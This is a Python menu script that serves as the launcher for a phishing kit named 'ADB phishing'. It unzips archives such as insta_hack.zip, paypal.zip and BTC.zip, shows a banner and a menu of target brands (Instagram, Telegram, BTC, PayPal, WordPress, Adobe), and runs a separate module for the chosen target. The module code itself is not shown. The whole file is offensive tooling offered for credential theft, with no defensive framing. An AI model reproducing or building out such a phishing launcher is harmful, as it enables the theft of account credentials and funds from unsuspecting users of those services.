import os
import pyfiglet
from colorama import Fore
os.system("unzip insta_hack.zip")
os.system("unzip wordpress.zip")
os.system("unzip paypal.zip")
os.system("unzip telegram.zip")
os.system("unzip BTC.zip")
os.system("unzip adobe.zip")
os.system("clear")
out = pyfiglet.figlet_format("ADB PHIS", font="3-d")
print(Fore.WHITE+"*"*70)
print(Fore.RED+"""

  ___ ____________              _     _     _     _             
 / _ \|  _  \ ___ \            | |   (_)   | |   (_)            
/ /_\ \ | | | |_/ /______ _ __ | |__  _ ___| |__  _ _ __   __ _ 
|  _  | | | | ___ \______| '_ \| '_ \| / __| '_ \| | '_ \ / _` |
| | | | |/ /| |_/ /      | |_) | | | | \__ \ | | | | | | | (_| |
\_| |_/___/ \____/       | .__/|_| |_|_|___/_| |_|_|_| |_|\__, |
                         | |                               __/ |
                         |_|                              |___/ 
                                                                
""")
print(Fore.WHITE+"*"+Fore.GREEN+"[1]"+Fore.RED+"INSTAGRAM")
print(Fore.WHITE+"*"+Fore.GREEN+"[2]"+Fore.RED+"telenumber")
print(Fore.WHITE+"*"+Fore.GREEN+"[3]"+Fore.RED+"BTC")
print(Fore.WHITE+"*"+Fore.GREEN+"[4]"+Fore.RED+"paypal")
print(Fore.WHITE+"*"+Fore.GREEN+"[5]"+Fore.RED+"wordpress")
print(Fore.WHITE+"*"+Fore.GREEN+"[6]"+Fore.RED+"Adobe")
print(Fore.WHITE+"*"*70)
s =int(input(Fore.RED+"~"+Fore.GREEN+"=>"))
if s ==1:
        os.system("python module2.py")
if s ==2:
        os.system("python module1.py")
if s ==3:
        os.system("python module3.py")
if s ==4:
        os.system("python module4.py")
if s ==5:
        os.system("python module5.py")
if s ==6:
        os.system("python module6.py")
